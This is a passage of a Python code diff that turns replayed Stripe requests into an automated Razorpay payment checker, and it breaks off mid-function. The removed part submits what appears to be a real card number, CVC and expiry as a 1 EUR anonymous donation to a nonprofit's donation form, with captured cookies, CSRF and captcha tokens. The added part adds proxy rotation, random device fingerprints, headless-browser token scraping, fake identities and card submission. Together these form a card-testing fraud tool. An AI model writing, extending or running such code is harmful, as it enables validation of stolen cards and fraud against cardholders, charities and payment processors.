@@ -1,134 +1,624 @@
 import requests
+import json
+import time
+import random
+from urllib.parse import urlencode, urlparse, parse_qs, unquote
+from datetime import datetime
+import re
+import os
+import platform
+import string
+from playwright.sync_api import sync_playwright
 
-headers = {
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'priority': 'u=1, i',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Ace";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-}
+PROXY_CONFIG = None
 
-data = 'type=card&billing_details[name]=Anonymous&billing_details[address][postal_code]=32839&card[number]=5523426692360534&card[cvc]=972&card[exp_month]=08&card[exp_year]=29&guid=ff9d84b2-8755-4c07-94b0-5ef6f83eaeac71e276&muid=f342545e-7e9b-42d9-aa16-552ca2f59417b61e3a&sid=0d9f9eff-fd05-432b-b076-c09c3cc69ca204f447&payment_user_agent=stripe.js%2F6c540ed284%3B+stripe-js-v3%2F6c540ed284%3B+split-card-element&referrer=https%3A%2F%2Fesnorg.giveforms.com&time_on_page=77249&client_attribution_metadata[client_session_id]=447fd8cb-e96a-4f6c-b350-db0d1fddc317&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=506d5d01-2065-44bd-a9e9-ea2bf632c32a&key=pk_live_2T8mSGhZyE3A8I2kToOFE1R9&radar_options[hcaptcha_token]=P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg5MDc4OTM5LCJjZGF0YSI6IlhkYWZGQkJESDFDM0xhL0R2NFd0RWVLenhQV2dTRGJuRnRPd1BTSXJUK1Rwb0k2dFAvb2IwQkJIM2ZNVVVqVm5HaklDNCtESFVHS0VUczN0eVVuTWppMDNlOWkwWUllV084eHN6OFVIc0Fad0NacWVvcDZaUGNnTkRHd2xlSURsS05URGtpSlhQMjE4UStWTU94UVVscHpYYUFDcXZ3R0VtVXNnSmU4K3BFUXE2eDYzVHJNclRXS0k4Wnl1TmhYOXRlRjZzdmo2NjZ6ODIzYjFOSE5uV1J1ZmlsV3RwZGkvVkN5WnRyMElqTzM3aklJZDNSUFlUcWNSOWpicWhFSE1OanhjSlQ2TkZtVmwzbXdKeVh3SzBkaFgrbXExSmwwWkl4aU1jYlRZL2pWdDk2M09ZZWJJZVNlWkhMcmdHSVU1bnVDOXBoZXRXRnJ5Z1dMd0tHMEZDbFQyd1ZTNVZTVmVDUXR6UnRzVy8wVT1ZQ2JtNFFuWUMxU2c5MFV6IiwicGFzc2tleSI6IkhlMGMwTHNkaVZHaGpFZ0hTSklETkw3d2pxKzRGUzF4UkxEYzJLQVMrKzQxK1p1bzU1N3BkQWo5TjlaaEVtYWVIS21jSjd3dkQrbHFWRGpISXplK0tCam5FV2xDZVB4VHg4Z3FLM3lUVzlHc2NaQkVhRWtYYU8wU1lOUkJCMVFwUW50ZUNjZ3h3SEpTWXFwNkROaW83M1JTOFFSeU5JamVwUVhEUkNLZDhKZ2pUVVI0Q0F5a1lRT2U4TXlsVW8yakRYQ2RINjMzYklOcFdOenFoQ1VKQmEyZEJWUTNobXJXYk9jblBsSnVWTUthdXFBOGFIbGdRWE1MUTNNbE9Qelpub3Jaa2xMRHdDR012VS9IL3d6aWdFa2h3Yk0zSldOUDA1ZHViZUVNL091cXkwWGprNjVhN015Y0tpY0RTMENCT0VjeFd3U1RYYU9GZE5WL3JWQ0VlR2ZKU1VCYUhEc0M0ZHpDSTVjSmFqMWRCR2t5U2xZUnN3Tm5mQ3o2bnFYN0tvc1lObVB5UENuSkdpQlk5RG9CUjhjZEhuUWJkdEhBL3ZCSTc5L3VqdG5RbW1QcTdkTkZDRkxQYzV0M2F5N0UyVXhIWjJTVlZLWlZORTlkOEZjd0ZkUFpLMzhpbnNuci9ab1VhREVJUW56L050ZzFCTmtOVDdSSXZNZExCRURML251OUl1cTBBMkI4RGtqa2R4cXRuZHBsaU9EWUFnQXBkbno2ejIvSFpHbmtiMVlHNFNjZDFHSE5NUEJQM0RxTzJyU0xlaGVtWUMwMjl2T3g0Y0NROTRVWnBUWkcxaFJzcWJmQnYrR2E5VUZLaGlBWkMzZWJHOCtyNmt3U0R1azJjRjN2OVV1V2U0YmJqT1RRbHpEQ1lkdkoyc2dnZ0NBQjJ4N0EycWFaK1NqYWg5K1Q5M1U1d296ZUlNSlNGQm1tUjZJcWIzUk4vVUUrRnJGQkZ3enlXZW1YN2xScnNOQnBKeXdzSWZUSVI0dUg1MklycEdRbXM2VDBRNERkbmpQU3hES1FJUkFjb29mMEsrN2xnaGpPckEvYlhlR0dMbGNRZE1VQ01SaVpmR001RzRZcGkzdTNvaHVwTXVnU0drbW5qUUh4OXJHZjRFMlcyeEVaQW8zVXVqSDU5ZG5relJCUXB0d0RLTmkzWmFTSzI4TDNpUXZST2lkTVc1di8zR2dXaXMwV21GNzdCdXZ5UmFsQjlTVHQ0dHQ3UVlvZlNoRnhlMCsyL01xSFc4bXRXblRJRExGaElZQXVDOFVrNTB0SmRGNkFBVTRVbFliWGdCZXRNVEVDMEd2Z0dITVo0bHY1a09VTzlFOE5pTnVUN1FLb1B3bTBGN0IzQVVLTXpHaXVwYWJWamp6VFo4OS9OZk0yemNQWGNhQlZSSUdST1NzOCtnYk90TGtna2Z2eU9wdTE4a0tLNk9VL3d2blZFSHlEelhxOHBWK1hXNEJzUDVxM2hrTVl6RFN6VjQ0YnZyNjExY3RyZTBwbGdGTVFsTnB2SzByMVdqOUZYSTRrV0VlUDRTeHJTM0dxV2hiY1pwZk5vTEk1SmtCRk82d29taEVUUU5obklEaFN2bTJkUzhUVjd3aHJGR2hoWHE1TDI2TlNjTUVNMnRxSFBZL2ZKOHQxenJ1M21KOStnVXNXVG5lMFgrUnJ3MXFGUWRXUmpPd2pyMTRtalVxRHM1U1M0d3ZMNS9JdjB2OHoyZkZlYUxIWnRhMW5SbDhFMytTdXo3d0QwekduVC8xVThia1A1K1czay9RVHJtanBVVUpwQlZmSG9yd3k5RXpYMGN6NmpFaXVIMTBpNXAzRE9tc2NSbXAzZUh1bWZ1eW1IUjgya3l4S1BudnRvclB5S2JGS0JUQS9RNDFVdVFHdEdJRjJaRlNyR1NGdFpjZHVWQkx3OVhicU1LZzJTcGN6QVdpUmo5bXgzWEc5SkpqK1hUTkxNUmprS2ZLMnBKTUpvR3h6VWR6UGtQRVI4cEJZMG8yZWdoQStvYzE1M3pRRXpuSEZEdjV5d0drblJDc1hTK0FPZGgvWElZd2pnQzhEc293eUNuNnZtUXNraTlrRUJMT2luSHpKa1ZaOWM1allxL04vTlYzWmN2eGVoeklzRkFBTWl5NGZ0WXZIZWU4enpwb2JsVTRrRGlib0lJVDlsRW9XeEpRZmNWVy9meXQyUjdsTjcrTVdDd1I5bm56NnJOZXhuS1JUQ2NIcHJ4WUxHb3RRd2lGcWttaFErVTFwTlgwK1FCd1MyRC9DMlE3dG41UGpSb2VqV1doalBlNnhadzg5TEphNFVXemlWU3RNeGc5QTZUdXVWdnlmbm96WnBjK1orT0pSc3hacUN5YVhqakNySWYzRDl3cWNXS21FMW5OQUF1VWFJTmxmVHVnL3h3RFlrT1BTNmZ0RFhXUG1Qd2s3eXEzbzlBWUFjWjFTY2tjSmx5eC9FeVNsUytvU1V3NW1hZ2hYWTJFWXJQME05S000cWlPTU1qUUdyWEhidjd1TWp5NEFNUnY3QTE0cnk4RHBkVy9MTU1MVWRlREhRU3ZzRHVlOFMrM2czNXpSSlUyTzhEZmhLZzNiUkZlWDd3aWNtZmVyUnN2dXdkQS91NXM0WmRFbjlDTWs2bW45SDdEZmpnYzFiL3VYSTl3V3Z5Ry9rdm85bzl1Z0ZhZVFHOCs4dGR5bEpSZ3R5V3l2VWo2M3h2RXYvdVR2N2ZkQ0Q5L01VNkFNd3IraVV2azJZSTkxZzF6cnN2TWFMTExYczkrTzNVWFlWd2VMS2tlSFRCZ0FSMmFsUE5zVzYxUXRPbW1NRVYyUVoxRTlQSnIwYnZZcHVieFpuSUgzWmFLRDBaaU1NVTBPNmRDNzhRPT0iLCJrciI6IjQ4NGE1Mjk2Iiwic2hhcmRfaWQiOjIyMTk5NjA3M30.Y8zRJfeyg8J5rT-JO13bjyWmvUQW_jpEgqyL_XMCOyY'
 
-response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+def generate_device_fingerprint():
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choice(chars) for _ in range(128))
 
-import requests
 
-headers = {
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'priority': 'u=1, i',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Ace";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-}
+DEVICE_FINGERPRINT = generate_device_fingerprint()
 
-data = {
-    'client_id': 'stripe-js',
-    'num_requests': '3',
-    'events': '[{"event_name":"elements.captcha.passive.success","created":1789078836385,"batching_enabled":true,"event_count":"110","os":"Windows","browserFamily":"Chrome","version":"6c540ed284","event_id":"1e02d4a0-5e51-4a37-9b34-dc3651c25627","team_identifier":"t_5","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2024","connection_rtt":"250","connection_downlink":"1.65","connection_effective_type":"4g","key":"pk_live_2T8mSGhZyE3A8I2kToOFE1R9","key_mode":"live","referrer":"https://esnorg.giveforms.com","stripe_js_id":"447fd8cb-e96a-4f6c-b350-db0d1fddc317","stripe_obj_id":"sobj-5600010a-ddda-4f17-85cd-e286802f4261","controller_load_time":"1789078766519","stripe_js_release_train":"v3","wrapper":"unknown","es_module":"false","browser_timezone":"America/New_York","embedded_in_mobile_sdk":"false","elements_init_source":"stripe.elements","deploy_status_fetch_failed":"false","isSafariPrivateMode":"false","deploy_status_time_to_fetch_ms":"5838","cdn_name":"Cloudfront","cdn_pop_dc":"LAX","experiments_exposed-elements_ce_human_security":"control","experiments_exposed-link_ce_conversion_unrecognized_aa":"control","experiments_exposed-link_ce_conversion_unrecognized_post_entry_aa":"control","isLinkInCardEnabled":"true","frame_width":"724","duration":"2","site_key":"463b917e-e264-403f-ad34-34af0ee10294","schema_validation":"failed"},{"event_name":"rum.stripejs","created":1789078836952,"batching_enabled":true,"event_count":"111","os":"Windows","browserFamily":"Chrome","version":"3","event_id":"42ca9090-0989-4703-8dc2-3f2708845bbd","team_identifier":"t_7","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2024","connection_rtt":"250","connection_downlink":"1.65","connection_effective_type":"4g","key":"pk_live_2T8mSGhZyE3A8I2kToOFE1R9","key_mode":"live","referrer":"https://esnorg.giveforms.com","stripe_js_id":"447fd8cb-e96a-4f6c-b350-db0d1fddc317","stripe_obj_id":"sobj-5600010a-ddda-4f17-85cd-e286802f4261","controller_load_time":"1789078766519","stripe_js_release_train":"v3","wrapper":"unknown","es_module":"false","browser_timezone":"America/New_York","embedded_in_mobile_sdk":"false","elements_init_source":"stripe.elements","deploy_status_fetch_failed":"false","isSafariPrivateMode":"false","deploy_status_time_to_fetch_ms":"5838","cdn_name":"Cloudfront","cdn_pop_dc":"LAX","experiments_exposed-elements_ce_human_security":"control","experiments_exposed-link_ce_conversion_unrecognized_aa":"control","experiments_exposed-link_ce_conversion_unrecognized_post_entry_aa":"control","isLinkInCardEnabled":"true","requestId":"req_AK18hgttt4wTKC","tokenType":"card","url":"https://api.stripe.com/v1/payment_methods","status":"200","start":"1789078836415","end":"1789078836952","resourceTiming[startTime]":"77078.2","resourceTiming[duration]":"520.9","resourceTiming[redirectStart]":"0","resourceTiming[redirectEnd]":"0","resourceTiming[fetchStart]":"77078.2","resourceTiming[domainLookupStart]":"77078.2","resourceTiming[domainLookupEnd]":"77078.2","resourceTiming[connectStart]":"77078.2","resourceTiming[connectEnd]":"77078.2","resourceTiming[secureConnectionStart]":"77078.2","resourceTiming[requestStart]":"77092.2","resourceTiming[responseStart]":"77595.8","resourceTiming[responseEnd]":"77599.1","paymentUserAgent":"stripe.js/6c540ed284; stripe-js-v3/6c540ed284","schema_validation":"passed"},{"event_name":"elements.create_payment_method.success","created":1789078836964,"batching_enabled":true,"event_count":"112","os":"Windows","browserFamily":"Chrome","version":"6c540ed284","event_id":"40384e41-b6fa-44dc-99b4-ec83da62eb5b","team_identifier":"t_5","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2024","connection_rtt":"250","connection_downlink":"1.65","connection_effective_type":"4g","key":"pk_live_2T8mSGhZyE3A8I2kToOFE1R9","key_mode":"live","referrer":"https://esnorg.giveforms.com","stripe_js_id":"447fd8cb-e96a-4f6c-b350-db0d1fddc317","stripe_obj_id":"sobj-5600010a-ddda-4f17-85cd-e286802f4261","controller_load_time":"1789078766519","stripe_js_release_train":"v3","wrapper":"unknown","es_module":"false","browser_timezone":"America/New_York","embedded_in_mobile_sdk":"false","elements_init_source":"stripe.elements","deploy_status_fetch_failed":"false","isSafariPrivateMode":"false","deploy_status_time_to_fetch_ms":"5838","cdn_name":"Cloudfront","cdn_pop_dc":"LAX","experiments_exposed-elements_ce_human_security":"control","experiments_exposed-link_ce_conversion_unrecognized_aa":"control","experiments_exposed-link_ce_conversion_unrecognized_post_entry_aa":"control","isLinkInCardEnabled":"true","frame_width":"724","object_id":"pm_1UEGKeDItA2xiqUeHvdKHGs1","object_kind":"payment_method","object_type":"card","object_livemode":"true","element":"cardNumber","usesLink":"false","hasValidMids":"true","schema_validation":"failed"}]',
-}
 
-response = requests.post('https://r.stripe.com/b', headers=headers, data=data)
+def setup_proxy(proxy_string):
+    if not proxy_string or proxy_string.strip() == "":
+        return None
+    try:
+        parts = proxy_string.strip().split(':')
+        if len(parts) == 4:
+            ip, port, user, pw = [p.strip() for p in parts]
+            if not all([ip, port, user, pw]):
+                return None
+            return {"server": f"http://{ip}:{port}", "username": user, "password": pw}
+        return None
+    except:
+        return None
 
-import requests
 
-cookies = {
-    '__stripe_mid': 'f342545e-7e9b-42d9-aa16-552ca2f59417b61e3a',
-    '__stripe_sid': '0d9f9eff-fd05-432b-b076-c09c3cc69ca204f447',
-    '_giveforms_session': 'TKtH57pMDqhTqBBp2Fmc8Xf85G0O5sheI8OCdMk%2B3WLxdNDK0cpdOcZmvYAqvIX%2FCIaGVHI5BUeMvXexYfsjLF%2FC6YGkqfRfWvPKJfW6ncrC85iLDilRl2Cm3KTWOdOsaq0otgvbtaHILqH7mE0%3D--gmWWtXsbzzBVo3K6--LgsBF09gbREGVNpJaYLnnQ%3D%3D',
-}
+def get_dynamic_session_token():
+    try:
+        with sync_playwright() as p:
+            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
+            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
+            page = browser.new_page()
+            page.set_extra_http_headers({
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            })
+            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
+            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
+            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
+            browser.close()
+            return (token, None) if token else (None, "Token not found in URL.")
+    except Exception as e:
+        return None, f"Session token error: {str(e)[:100]}"
 
-headers = {
-    'accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://esnorg.giveforms.com',
-    'priority': 'u=1, i',
-    'referer': 'https://esnorg.giveforms.com/default-giveform',
-    'sec-ch-ua': '"Ace";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-    'x-csrf-token': 'L1sujkkTTnW7J0pTJYR3rLcBYOuGR7rFrtGBD8Zs+b74eU2BsNju8/go8kXa6K3f69TKgyPTxJyaOCsd5+CvsA==',
-    'x-requested-with': 'XMLHttpRequest',
-    # 'cookie': '__stripe_mid=f342545e-7e9b-42d9-aa16-552ca2f59417b61e3a; __stripe_sid=0d9f9eff-fd05-432b-b076-c09c3cc69ca204f447; _giveforms_session=TKtH57pMDqhTqBBp2Fmc8Xf85G0O5sheI8OCdMk%2B3WLxdNDK0cpdOcZmvYAqvIX%2FCIaGVHI5BUeMvXexYfsjLF%2FC6YGkqfRfWvPKJfW6ncrC85iLDilRl2Cm3KTWOdOsaq0otgvbtaHILqH7mE0%3D--gmWWtXsbzzBVo3K6--LgsBF09gbREGVNpJaYLnnQ%3D%3D',
-}
 
-data = {
-    'utf8': '✓',
-    'donation[user_id]': '311',
-    'donation[form_id]': '343',
-    'sf': 'ip1j20rpcx7343',
-    'bf': '31de13a219b4a2a961e40a75812ed546',
-    'idempotency_key_index': '1789078758147',
-    'donation[currency]': 'eur',
-    'donation[amount]': '1',
-    'donation[monthly]': '0',
-    'donation[real_amount]': '1.00',
-    'donation[used_text]': '',
-    'donation[utm_source]': '',
-    'donation[utm_medium]': '',
-    'donation[utm_campaign]': '',
-    'donation[utm_content]': '',
-    'p': '',
-    'donation[anonymous]': [
-        '0',
-        '1',
-    ],
-    'donation[first_name]': '',
-    'donation[last_name]': '',
-    'donation[email]': 'bu@gmail.com',
-    'donation[phone_home]': '',
-    'donation[donation_type]': 'credit_card',
-    'stripeToken': '',
-    'stripe_pm_id': 'pm_1UEGKeDItA2xiqUeHvdKHGs1',
-    'stripe_pi_id': '',
-    'financial_connections_account_id': '',
-    'stripe_public_key': 'pk_live_2T8mSGhZyE3A8I2kToOFE1R9',
-    'donation[cover_fee_checked]': '0',
-    'g-recaptcha-response-data[donation]': '0cAFcWeA7qxIWSkwMV91tUYynw5A5zmy-I9KwdnCqQ7wMsBVGwDzF8XbaLK46Zyt-D8ujuFU2MTJRBgMzTjazAsKWoz1EagqJYnXnjfyTArQAiVt-qVh3DeKgznhpB-MdLFck5fo9G3uSriHv8ajABhb5xCyoHEuS7g8U--nnfvIW6SAzCqc_qLsQzLoD6QXwn5Iw50icuGQAm4JwgGpbNR7TdY5xeb1c1xnPS3hdLRI36r9w9UZSEjXof5PXICU_PHemNplVhCo0838nBvI4xfFxNv0H-zLZUwMj5RPXTLwoQUHPgRgr_TKSL3e6lH9R9eX1KTzM1ao9UMmvaS_TYpSvwQCv111yRKle2DCfN34dXFdjKaWxvJkJLaoF_XdN-StYAHJUflVk5vlP4eJ2VqjaEGXjPxljhSDAD-zSlKopmN8u1WN4vMTrcK2d1LMSSMyFoH3B2RLOp3_AoeH4LvKJxS4DNArjamwFR4VJYz_ttLLy-pfCohU7iEz7i7Z8lfx-N1rQlIdUaYFziqnyXzWoAxGw5yJHXO4B8-oCMuBVSAzz5ObinVymQGePBMLp7_jdMDwNGIsKImT1pP-70qSFOArCagSmeuskKfM45U6ObsyjZhRLx8C_MTdJTTUfgaHT0YHln-58k-uppUtWcMvHzVm1BwnHQjDlfz1Rz9Gm5o5mE-uRFNfdydFO7MavDyGzp-xCcdL2CUAaDE1KXsLo9q2m1hAUtmc_cjoYfktgGPxHS0OrLcmhRo2fQfw5k5dEQattXxHIsSngFeyVSI5CfPTKqwf7Wz0H2M2V-TW2tgNZOEcrfwJsAxvtybI_pP7UgD9b1g_ECx4AD5Hvcsnrs77gI7uoiIR02yepJ22Cx3axGG8vqB8xa0qI1eNCsrNHFt5w0oJiBZxWbjB4d4fo_ybUY_pLPKBmrMy-_X44QSC1MsZAovtjRwBo98SUxNY7hkagZMHWf8RW6zaP_Ync7lwT2rKVwAXOUq9Xsicq-eU0MQTki_DoaYhfRRyEx4lcJ6nSnJvrVMDrnucFdCf-4N-sYJz8Fzf57VVmmQLHF_lmPFiuddrblmJdVjAPw5KoRCbLgKdvrQEY3RVwR4KH50VbzLYufpRJJggDS5ZDUkadUaDbjXt2n7-BWf7MCE44hU1D9O4tcTxR9G0J9FG-DaIvCzaT0WAshPEeW5V6sW6fjtW3I9QQ6w8F5xbffg-hoy9hWHJ7PZNSQT45KEj5MjkzuVwMcDNovsRNrIHoIf8blngldpl7WxREAEpUJrTYmwjFJnDaf6TmWJV08nv8vAxTnflOHpZFWIuFeXpc6bV48LTiu9IKdYPX8D2TOs4SfOFVDdLp4KTORYexcfcg-4nk47fwqDAM1pUzPMdokcfTDGMCmLJ7bk65nJtQ5VmLoZcSimLZZccMTHrf1hos0IPmUGRFJ3W97Pa28RcwWiduAK_4pTYQcLIFf6PjvWM76wIxWfEOHuPThrvxwvvWrLBuvi73x6uWcNCH9D9KBz1ey_nneF1f6KHH1ViUJ6E3M5ZuoVVnoV_zY2luvXxaZzlC4UZP26MNaY0N4TPCpLfdKC4T1ccAcJTAWDGgZIde6YyF-r6bsn7dL__6twhYrEAK_Si9sNKrcckNj4q1S39ZJQzgtElpfP-odAsEfBnw7ZoAIVLoaC5Gu5qssa6WR3JQ2b4bhQ02krdR47aTVZOanNoSefO3vtlbyiM9X1vBUTayeESMWTl4DMBXEdML44_yT0rKyOPvxbW_3kpFczwtplL8yuVkHKEc-RDqqGd4Z1uV5MCorU2dKIDfpWmb1Fuu0Gb470TnkZ9IYwwhzRVRLxl5DZNiEaTtNH0IbJ9QdI7I-6roEEaTAv6PULHXJ0zDaXOaOZAAS9W3d7eDjZA4hQe_Q1ll5xqeZyzfU2ulat2J0BpOo4zdvgzwQOMPszoYy1BH-qy7b-gEI-k6Avz9pMvQSG57t0xTmhIndFO4uUd8YE9YvjgRY7kEor0QaUCBrRFhHDs8np46QWYrhBkMWZ5Fi83HeKplDRIrjdP-EQeifPdUeiazv82J6KQmbljKs_jCFEZ4XBn80gar46LoTrmK7xzKmUm240zg5rC7hwFx1_5D0Z9V2swZLHisKC77tci_Mw1c-t1LpqOCAYHpbk7HoWRq2tgSlk-dzhwiQs1YUNQYJm_T51hi2bVZYmIfX_GLGfBeW_ABJ1_w8VeTa-oZzoFVKtUY08dEzJXEs6M2V0WJhMWshdEawoaZ1fJ0RXwWKC2iJ-S-wdsDskxVJ2yMnRF6CNt1pVjwgj4PpJI4cTyg9_W8kJOUIwhLBIkIWxNO54_F1tIR1zVaFgDOczJ3daZQsJEumNOXimG2NAp4zdxH3ckMA0Wg7FRnZ717M32T8BWUa6eOAYzg2hnshP1vejQI',
-    'g-recaptcha-response': '',
-}
+def extract_merchant_data(site_url):
+    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
+    merchant_handle = merchant_match.group(1) if merchant_match else None
 
-response = requests.post('https://esnorg.giveforms.com/donations', cookies=cookies, headers=headers, data=data)
+    try:
+        with sync_playwright() as p:
+            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
+            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
+            page = browser.new_page()
+            page.set_extra_http_headers({
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            })
 
-import requests
+            intercepted = {}
+            def on_resp(r):
+                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
+                    try:
+                        intercepted['data'] = r.json()
+                    except:
+                        pass
 
-headers = {
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'priority': 'u=1, i',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Ace";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-}
+            page.on("response", on_resp)
+            page.goto(site_url, timeout=45000, wait_until='networkidle')
+            page.wait_for_timeout(3000)
 
-data = 'type=card&billing_details[name]=Anonymous&billing_details[address][postal_code]=32839&card[number]=5523426692360534&card[cvc]=972&card[exp_month]=08&card[exp_year]=29&guid=ff9d84b2-8755-4c07-94b0-5ef6f83eaeac71e276&muid=f342545e-7e9b-42d9-aa16-552ca2f59417b61e3a&sid=0d9f9eff-fd05-432b-b076-c09c3cc69ca204f447&payment_user_agent=stripe.js%2F6c540ed284%3B+stripe-js-v3%2F6c540ed284%3B+split-card-element&referrer=https%3A%2F%2Fesnorg.giveforms.com&time_on_page=346757&client_attribution_metadata[client_session_id]=447fd8cb-e96a-4f6c-b350-db0d1fddc317&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=506d5d01-2065-44bd-a9e9-ea2bf632c32a&key=pk_live_2T8mSGhZyE3A8I2kToOFE1R9'
+            eval_data = page.evaluate("""() => {
+                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
+                if (d && d.keyless_header) return d;
 
-response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+                for (let k in window) {
+                    try {
+                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
+                    } catch(e) {}
+                }
+
+                const scripts = document.querySelectorAll('script');
+                for (let s of scripts) {
+                    const txt = s.textContent || s.innerText;
+                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
+                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
+                        if (matches) {
+                            for (let match of matches) {
+                                try {
+                                    const parsed = JSON.parse(match);
+                                    if (parsed.keyless_header || parsed.key_id) return parsed;
+                                } catch (e) {}
+                            }
+                        }
+                    }
+                }
+                return null;
+            }""")
+            browser.close()
+
+            final = eval_data or intercepted.get('data')
+            if final:
+                kh = final.get('keyless_header')
+                kid = final.get('key_id')
+                pl = final.get('payment_link') or final
+
+                if isinstance(pl, str):
+                    try:
+                        pl = json.loads(pl)
+                    except:
+                        pass
+
+                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
+                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
+                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
+
+                if kh and kid and plid and ppi:
+                    return kh, kid, plid, ppi, None
+
+            if merchant_handle:
+                try:
+                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
+                    response = requests.get(api_url, timeout=10)
+                    if response.status_code == 200:
+                        api_data = response.json()
+                        kh = api_data.get('keyless_header')
+                        kid = api_data.get('key_id')
+                        plid = api_data.get('id')
+                        ppi = api_data.get('payment_page_items', [{}])[0].get('id')
+                        if kh and kid and plid and ppi:
+                            return kh, kid, plid, ppi, None
+                except:
+                    pass
+
+            return None, None, None, None, "Extraction failed."
+    except Exception as e:
+        return None, None, None, None, f"Extraction error: {str(e)[:100]}"
+
+
+def random_user_info():
+    return {
+        "name": "Test User",
+        "email": f"testuser{random.randint(100, 999)}@gmail.com",
+        "phone": f"9876543{random.randint(100, 999)}"
+    }
+
+
+def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
+    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    payload = {
+        "notes": {"comment": ""},
+        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
+    }
+    try:
+        resp = session.post(url, headers=headers, json=payload, timeout=15)
+        resp.raise_for_status()
+        return resp.json().get("order", {}).get("id")
+    except:
+        return None
+
+
+def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
+    card_number, exp_month, exp_year, cvv = card_info
+    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
+    params = {
+        "key_id": key_id,
+        "session_token": session_token,
+        "keyless_header": keyless_header
+    }
+    headers = {
+        "x-session-token": session_token,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0"
+    }
+    data = {
+        "notes[comment]": "",
+        "payment_link_id": payment_link_id,
+        "key_id": key_id,
+        "contact": f"+91{user_info['phone']}",
+        "email": user_info["email"],
+        "currency": "INR",
+        "_[library]": "checkoutjs",
